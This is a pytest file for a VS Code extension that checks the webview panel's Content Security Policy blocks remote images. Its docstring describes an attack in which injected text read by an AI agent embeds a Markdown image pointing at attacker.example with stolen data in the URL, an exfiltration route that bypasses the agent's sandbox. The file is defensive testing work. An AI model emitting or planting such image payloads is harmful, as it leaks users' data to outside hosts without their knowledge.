"""R848 · A prompt cannot make the VS Code panel contact an address of its choosing.

The text of a prompt comes from the agent, and the agent reads web pages, issues,
mail and files that anyone can write to. The panel renders that text as Markdown
and keeps the images in it, so a line such as

    ![](https://attacker.example/p.png?d=<something the agent just read>)

becomes an ``<img>`` that the browser engine fetches on its own, with the data in
the URL. Nothing asks the person, and it works even when the agent's own sandbox
has no network, because the request leaves from the person's machine.

The panel's content security policy is what stops it. Until R848 ``img-src``
named the whole ``https:`` scheme, so an image on any HTTPS host loaded. The Web
UI in the browser never allowed that (``img-src 'self' data: blob:``), and its
troubleshooting page already says that a remote image is blocked there. The panel
now matches: images come from the Web UI server (the local images of R726 and the
uploads), from ``data:`` URLs (the previews of attached files) and from the
panel's own resources, nowhere else.

The policy is read from the template in ``webview.ts``, the only place that
writes it; ``${serverUrl}``, ``${cspSource}`` and ``${nonce}`` are the only
substitutions it makes. ``packages/vscode/test/webview-csp.test.js`` makes the
same statement about the HTML the extension really renders.
"""

from __future__ import annotations

import re
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
WEBVIEW_TS = REPO_ROOT / "packages" / "vscode" / "webview.ts"

# What each directive may name. Adding a source to a directive, or a directive to
# the policy, is a decision about what the panel may reach: it belongs in this
# table, with the reason in the commit that changes it.
#
# ${serverUrl}  the Web UI server the panel talks to (the person's own setting)
# ${cspSource}  the webview's own origin for the extension's bundled files
ALLOWED_SOURCES: dict[str, set[str]] = {
    "default-src": {"'none'"},
    "base-uri": {"'none'"},
    "connect-src": {"${serverUrl}", "${cspSource}", "'self'"},
    "style-src": {"${cspSource}", "'nonce-${nonce}'"},
    "script-src": {"'nonce-${nonce}'"},
    "img-src": {"data:", "${serverUrl}", "${cspSource}"},
    "font-src": {"${serverUrl}", "data:", "${cspSource}"},
    "object-src": {"'none'"},
    "frame-src": {"'none'"},
}

# The ways a policy says "any remote address, not only the ones I listed": a whole
# network scheme, a bare wildcard, or a wildcard host. (``data:`` and ``blob:`` do
# not reach the network.)
OPEN_ENDED = re.compile(
    r"^(?:https?|wss?|ftp):$|^\*$|^[a-z][a-z0-9+.-]*://\*|\*\.", re.IGNORECASE
)


def _template_policy() -> str:
    source = WEBVIEW_TS.read_text(encoding="utf-8")
    found = re.findall(
        r'<meta http-equiv="Content-Security-Policy" content="([^"]*)"', source
    )
    assert len(found) == 1, "webview.ts must write the panel's policy in one place"
    return found[0]


def _directives(policy: str) -> dict[str, list[str]]:
    directives: dict[str, list[str]] = {}
    for part in policy.split(";"):
        tokens = part.split()
        if tokens:
            assert tokens[0] not in directives, f"{tokens[0]} is declared twice"
            directives[tokens[0]] = tokens[1:]
    return directives


class TestWhatThePanelMayLoadImagesFrom:
    def test_images_come_from_the_server_data_urls_and_the_panels_own_files(
        self,
    ) -> None:
        images = _directives(_template_policy())["img-src"]

        assert sorted(images) == sorted(["data:", "${serverUrl}", "${cspSource}"])

    def test_no_remote_address_can_be_an_image(self) -> None:
        images = _directives(_template_policy())["img-src"]

        assert not [source for source in images if OPEN_ENDED.search(source)]


class TestTheWholePolicy:
    def test_every_directive_and_source_is_one_the_table_names(self) -> None:
        directives = _directives(_template_policy())

        assert set(directives) == set(ALLOWED_SOURCES), (
            "a directive was added or removed: update ALLOWED_SOURCES on purpose"
        )
        for name, sources in directives.items():
            extra = set(sources) - ALLOWED_SOURCES[name]
            assert not extra, f"{name} names {sorted(extra)}, which is not allowed"

    def test_default_src_is_none_so_an_unlisted_kind_of_load_is_refused(self) -> None:
        assert _directives(_template_policy())["default-src"] == ["'none'"]

    def test_no_directive_names_a_whole_scheme_or_a_wildcard(self) -> None:
        for name, sources in _directives(_template_policy()).items():
            open_ended = [source for source in sources if OPEN_ENDED.search(source)]
            assert not open_ended, f"{name} is open to {open_ended}"


class TestTheCheckItself:
    """The patterns above must say yes to what they are meant to catch."""

    @pytest.mark.parametrize(
        "source",
        [
            "https:",
            "http:",
            "ws:",
            "wss:",
            "*",
            "https://*",
            "https://*.example.com",
            "*.example.com",
            "HTTPS:",
        ],
    )
    def test_open_ended_sources_are_recognised(self, source: str) -> None:
        assert OPEN_ENDED.search(source)

    @pytest.mark.parametrize(
        "source",
        [
            "'none'",
            "'self'",
            "'nonce-${nonce}'",
            "${serverUrl}",
            "${cspSource}",
            "data:",
            "blob:",
            "http://127.0.0.1:8081",
            "https://assets.example.com",
        ],
    )
    def test_named_origins_keywords_and_local_schemes_are_not(
        self, source: str
    ) -> None:
        assert not OPEN_ENDED.search(source)

    def test_the_policy_is_read_as_directives_and_sources(self) -> None:
        assert _directives("default-src 'none'; img-src data: https:;") == {
            "default-src": ["'none'"],
            "img-src": ["data:", "https:"],
        }

    def test_a_repeated_directive_is_refused(self) -> None:
        with pytest.raises(AssertionError, match="declared twice"):
            _directives("img-src data:; img-src https:")
